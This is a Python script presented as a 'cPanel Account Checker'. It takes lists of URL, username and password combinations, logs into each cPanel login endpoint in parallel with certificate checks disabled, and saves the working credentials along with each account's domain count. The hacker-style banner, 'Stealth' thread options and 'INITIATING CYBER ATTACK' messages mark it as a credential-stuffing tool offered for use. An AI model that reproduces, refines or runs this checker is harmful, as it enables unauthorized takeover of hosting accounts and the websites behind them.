import requests
import sys
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import random

requests.urllib3.disable_warnings()

pause_event = threading.Event()
pause_event.set()

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Hacker-style background colors
    print("\033[40m")  # Black background
    print("\033[32m")  # Green text
    
    banner = r"""
██████╗ ██████╗ █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██████╗ ██╗   ██╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔════╝██╔═══██╗██║   ██║██╔══██╗
██████╔╝██████╔╝███████║██║     ███████║██████╔╝██║     ██║   ██║██║   ██║██████╔╝
██╔═══╝ ██╔══██╗██╔══██║██║     ██╔══██║██╔══██╗██║     ██║   ██║██║   ██║██╔══██╗
██║     ██║  ██║██║  ██║╚██████╗██║  ██║██████╔╝╚██████╗╚██████╔╝╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                  
    ██████╗██╗  ██╗ ██████╗ ██╗    ██╗██████╗ ██████╗ ██╗   ██╗██╗   ██╗ █████╗ ██╗
   ██╔════╝██║  ██║██╔═══██╗██║    ██║██╔══██╗██╔══██╗╚██╗ ██╔╝██║   ██║██╔══██╗██║
   ██║     ███████║██║   ██║██║ █╗ ██║██║  ██║██████╔╝ ╚████╔╝ ██║   ██║███████║██║
   ██║     ██╔══██║██║   ██║██║███╗██║██║  ██║██╔══██╗  ╚██╔╝  ██║   ██║██╔══██║██║
   ╚██████╗██║  ██║╚██████╔╝╚███╔███╔╝██████╔╝██║  ██║   ██║   ╚██████╔╝██║  ██║███████╗
    ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
    """
    
    print(banner)
    print("\033[36m" + "═" * 80 + "\033[0m")
    print("\033[92m[+] cPanel Account Checker\033[0m")
    print("\033[96m[+] Author: chowdhuryvai\033[0m")
    print("\033[93m[+] Telegram: https://t.me/darkvaiadmin\033[0m")
    print("\033[95m[+] Channel: https://t.me/windowspremiumkey\033[0m")
    print("\033[94m[+] Website: https://crackyworld.com/\033[0m")
    print("\033[36m" + "═" * 80 + "\033[0m")
    print()

def hacker_loading(text, duration=2):
    """Hacker-style loading animation"""
    chars = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    end_time = time.time() + duration
    i = 0
    
    while time.time() < end_time:
        print(f"\033[92m\r{chars[i % len(chars)]} {text}\033[0m", end="", flush=True)
        time.sleep(0.1)
        i += 1
    print("\r" + " " * (len(text) + 10) + "\r", end="", flush=True)

def matrix_effect(lines=10):
    """Matrix-style falling code effect"""
    chars = "01"
    for i in range(lines):
        line = "".join(random.choice(chars) for _ in range(50))
        color = random.choice([92, 93, 94, 95, 96])  # Green, Yellow, Blue, Magenta, Cyan
        print(f"\033[{color}m{line}\033[0m")
        time.sleep(0.05)

def get_domain_count(url, username, password, output_file, counter):
    while not pause_event.is_set():
        time.sleep(0.1)

    # Clean the URL
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    data_user_pass = {
        "user": username.strip(),
        "pass": password.strip()
    }
    
    s = requests.Session()
    try:
        resp = s.post(f"{url}/login/?login_only=1", data=data_user_pass, timeout=20, allow_redirects=True, verify=False)
        login_resp = json.loads(resp.text)

        if "security_token" in login_resp:
            cpsess_token = login_resp["security_token"][7:]
            resp = s.post(
                f"{url}/cpsess{cpsess_token}/execute/DomainInfo/domains_data",
                data={"return_https_redirect_status": "1"},
                verify=False
            )
            domains_data = json.loads(resp.text)

            total_domain = 1
            if domains_data.get("status") == 1:
                total_domain += len(domains_data["data"].get("sub_domains", []))
                total_domain += len(domains_data["data"].get("addon_domains", []))

            # Success with hacker style
            print(f"\033[92m[✓] [{counter}] ACCESS GRANTED -> {url} | {username}:{password} | Domains: {total_domain}\033[0m")
            with open(output_file, "a", encoding="utf-8") as success_log:
                success_log.write(f"{url}|{username}|{password}|{total_domain}\n")

        else:
            # Failed attempt
            print(f"\033[91m[✗] [{counter}] ACCESS DENIED -> {url} | {username}:{password}\033[0m")

    except Exception as e:
        # Error with hacker style
        print(f"\033[93m[!] [{counter}] CONNECTION ERROR -> {url} | {username}:{password} | {str(e)[:50]}...\033[0m")
    finally:
        s.close()
        time.sleep(0.05)

def handle_ctrl_c(signum, frame):
    global pause_event
    pause_event.clear()
    print("\n\033[91m[!] SYSTEM PAUSED - INTRUDER DETECTED!\033[0m")
    while True:
        print("\033[96m[?] SECURITY OPTIONS:\033[0m")
        print("\033[96m[1] RESUME OPERATION\033[0m")
        print("\033[96m[2] TERMINATE PROCESS\033[0m")
        
        choice = input("\033[96m[?] SELECT OPTION [1/2]: \033[0m").strip()
        if choice == '1':
            print("\033[92m[+] RESUMING CYBER OPERATION...\033[0m")
            matrix_effect(3)
            pause_event.set()
            break
        elif choice == '2':
            print("\033[91m[!] TERMINATING PROCESS...\033[0m")
            hacker_loading("Wiping traces", 2)
            sys.exit(0)
        else:
            print("\033[93m[!] INVALID COMMAND. TRY AGAIN.\033[0m")

def select_file():
    print("\033[96m[?] SELECT TARGET LIST:\033[0m")
    print("\033[96m[1] ENTER FILE PATH MANUALLY\033[0m")
    print("\033[96m[2] USE DEFAULT TARGETS (targets.txt)\033[0m")
    
    while True:
        choice = input("\033[96m[?] ENTER CHOICE [1/2]: \033[0m").strip()
        if choice == '1':
            file_path = input("\033[96m[?] ENTER TARGET FILE PATH: \033[0m").strip()
            if os.path.exists(file_path):
                hacker_loading("Scanning target file", 1)
                return file_path
            else:
                print("\033[91m[!] FILE NOT FOUND. TRY AGAIN.\033[0m")
        elif choice == '2':
            if os.path.exists("targets.txt"):
                hacker_loading("Loading default targets", 1)
                return "targets.txt"
            else:
                print("\033[91m[!] targets.txt NOT FOUND. CREATE FILE FIRST.\033[0m")
        else:
            print("\033[91m[!] INVALID CHOICE. ENTER 1 OR 2.\033[0m")

def select_threads():
    print("\033[96m[?] SELECT THREAD COUNT:\033[0m")
    print("\033[96m[1] 5 THREADS  (Stealth)\033[0m")
    print("\033[96m[2] 10 THREADS (Balanced)\033[0m")
    print("\033[96m[3] 15 THREADS (Aggressive)\033[0m")
    print("\033[96m[4] 20 THREADS (Turbo)\033[0m")
    print("\033[96m[5] 25 THREADS (Overkill)\033[0m")
    print("\033[96m[6] 30 THREADS (Maximum)\033[0m")
    
    while True:
        choice = input("\033[96m[?] ENTER CHOICE [1-6]: \033[0m").strip()
        thread_options = {
            '1': 5, '2': 10, '3': 15, '4': 20, '5': 25, '6': 30
        }
        if choice in thread_options:
            hacker_loading(f"Configuring {thread_options[choice]} threads", 1)
            return thread_options[choice]
        else:
            print("\033[91m[!] INVALID CHOICE. ENTER 1-6.\033[0m")

def select_output():
    print("\033[96m[?] SELECT OUTPUT FILE:\033[0m")
    print("\033[96m[1] USE DEFAULT (success_results.txt)\033[0m")
    print("\033[96m[2] ENTER CUSTOM NAME\033[0m")
    
    while True:
        choice = input("\033[96m[?] ENTER CHOICE [1/2]: \033[0m").strip()
        if choice == '1':
            return "success_results.txt"
        elif choice == '2':
            output_name = input("\033[96m[?] ENTER OUTPUT FILE NAME: \033[0m").strip()
            if not output_name:
                return "success_results.txt"
            if not output_name.endswith('.txt'):
                output_name += '.txt'
            return output_name
        else:
            print("\033[91m[!] INVALID CHOICE. ENTER 1 OR 2.\033[0m")

def read_targets(file_path):
    targets = []
    valid_lines = 0
    invalid_lines = 0
    
    try:
        with open(file_path, 'r', encoding="utf-8") as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                # Skip empty lines and comments
                if not line or line.startswith('#') or line.startswith('//'):
                    continue
                
                # Try different separators
                separators = ['|', ':', ',', ';', '\t']
                parts = None
                
                for sep in separators:
                    if sep in line:
                        parts = line.split(sep)
                        # Clean each part
                        parts = [part.strip() for part in parts if part.strip()]
                        if len(parts) >= 3:
                            break
                        else:
                            parts = None
                
                if parts and len(parts) >= 3:
                    url = parts[0]
                    username = parts[1]
                    password = parts[2]
                    
                    # Additional validation
                    if url and username and password:
                        # Auto-add port if not present
                        if ':2083' not in url and ':2082' not in url and ':2096' not in url:
                            if url.startswith('https://'):
                                url = url.replace('https://', 'https://') + ':2083'
                            else:
                                url = url + ':2083'
                        
                        targets.append((url, username, password))
                        valid_lines += 1
                    else:
                        print(f"\033[93m[!] LINE {line_num}: MISSING DATA -> {line}\033[0m")
                        invalid_lines += 1
                else:
                    print(f"\033[93m[!] LINE {line_num}: INVALID FORMAT -> {line}\033[0m")
                    invalid_lines += 1
        
        print(f"\033[92m[+] VALID TARGETS: {valid_lines}\033[0m")
        if invalid_lines > 0:
            print(f"\033[93m[!] INVALID LINES: {invalid_lines}\033[0m")
        
        return targets
        
    except Exception as e:
        print(f"\033[91m[!] ERROR READING FILE: {str(e)}\033[0m")
        return []

def show_file_preview(file_path):
    """Show a preview of the file content"""
    try:
        print(f"\033[96m[?] TARGET FILE PREVIEW (FIRST 5 LINES):\033[0m")
        with open(file_path, 'r', encoding="utf-8") as f:
            for i, line in enumerate(f):
                if i >= 5:
                    break
                print(f"\033[96m[{i+1}] {line.strip()}\033[0m")
        print()
    except Exception as e:
        print(f"\033[91m[!] COULD NOT READ FILE PREVIEW: {str(e)}\033[0m")

def main():
    print_banner()
    
    # File selection
    input_file = select_file()
    
    # Show file preview
    show_file_preview(input_file)
    
    # Read targets
    print(f"\033[94m[+] SCANNING TARGET FILE: {input_file}\033[0m")
    hacker_loading("Analyzing targets", 2)
    targets = read_targets(input_file)
    
    if not targets:
        print("\033[91m[!] NO VALID TARGETS FOUND!\033[0m")
        print("\033[93m[!] EXPECTED FORMAT: url|username|password\033[0m")
        print("\033[93m[!] SUPPORTED SEPARATORS: | : , ; tab\033[0m")
        sys.exit(1)
    
    # Threads selection
    threads = select_threads()
    
    # Output selection
    output_file = select_output()
    
    print("\033[92m" + "═" * 80 + "\033[0m")
    print(f"\033[92m[+] TARGETS ACQUIRED: {len(targets)}\033[0m")
    print(f"\033[92m[+] THREADS DEPLOYED: {threads}\033[0m")
    print(f"\033[92m[+] OUTPUT FILE: {output_file}\033[0m")
    print(f"\033[92m[+] INITIATING CYBER ATTACK...\033[0m")
    print("\033[92m" + "═" * 80 + "\033[0m")
    print()
    
    matrix_effect(5)
    
    import signal
    signal.signal(signal.SIGINT, handle_ctrl_c)
    
    counter = 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for target in targets:
            url, username, password = target
            executor.submit(get_domain_count, url, username, password, output_file, counter)
            counter += 1
    
    print()
    print("\033[92m" + "═" * 80 + "\033[0m")
    print(f"\033[92m[+] MISSION ACCOMPLISHED! RESULTS SAVED TO: {output_file}\033[0m")
    print("\033[92m" + "═" * 80 + "\033[0m")

if __name__ == "__main__":
    main()
